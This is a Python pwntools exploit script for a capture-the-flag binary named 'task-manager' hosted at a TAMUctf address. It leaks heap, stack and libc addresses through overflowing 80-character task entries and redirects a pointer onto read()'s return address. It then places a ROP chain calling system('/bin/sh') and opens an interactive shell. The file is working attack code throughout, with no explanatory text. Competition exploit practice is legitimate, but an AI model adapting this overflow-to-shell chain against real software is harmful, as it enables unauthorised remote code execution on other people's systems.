from pwn import *

elf = context.binary = ELF('./task-manager')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')

#p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
p = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")

def add_task(data):
    p.sendlineafter(b"Enter your input: ", b"1")
    p.sendafter(b"Enter task (max. 80 characters): ", data)

def print_tasks():
    p.sendlineafter(b"Enter your input: ", b"2")

def delete_task():
    p.sendlineafter(b"Enter your input: ", b"3")

p.sendafter(b"Enter your name (max. 40 characters): ", b"A"*8)

add_task(b"A" * 80) 

p.recvuntil(b"Task you entered: " + b"A" * 80)
leak = p.recvline().strip()
chunk_B_ptr = u64(leak.ljust(8, b'\x00'))
heap_base = chunk_B_ptr - 0x360
log.success(f"Heap Base : {hex(heap_base)}")

payload1 = b"B" * 80 + p64(heap_base + 0x260)
add_task(payload1) 
add_task(b"C" * 72)
p.recvuntil(b"Task you entered: " + b"C" * 72)
stack_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Stack Leak (&tasks): {hex(stack_leak)}")

RET_OFFSET = 0xb0
ret_addr = stack_leak + RET_OFFSET
log.info(f"Main Return Address : {hex(ret_addr)}")
saved_rbp = ret_addr - 8
payload_libc_leak = b"C" * 80 + p64(saved_rbp)
add_task(payload_libc_leak)
add_task(b"D" * 8)
p.recvuntil(b"Task you entered: " + b"D" * 8)
libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Libc Leak (__libc_start_main_ret) : {hex(libc_leak)}")
libc.address = libc_leak - 0x2724a
log.success(f"Libc Base : {hex(libc.address)}")

read_ret_addr = stack_leak - 0x10
log.info(f"read() Return Address : {hex(read_ret_addr)}")

payload_target = b"E" * 80 + p64(read_ret_addr)
add_task(payload_target)

rop = ROP(libc)
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(next(libc.search(b"/bin/sh")))
rop.raw(rop.find_gadget(['ret']).address)
rop.raw(libc.sym['system'])

payload_rop = rop.chain().ljust(88, b'\x00')

add_task(payload_rop)

p.interactive()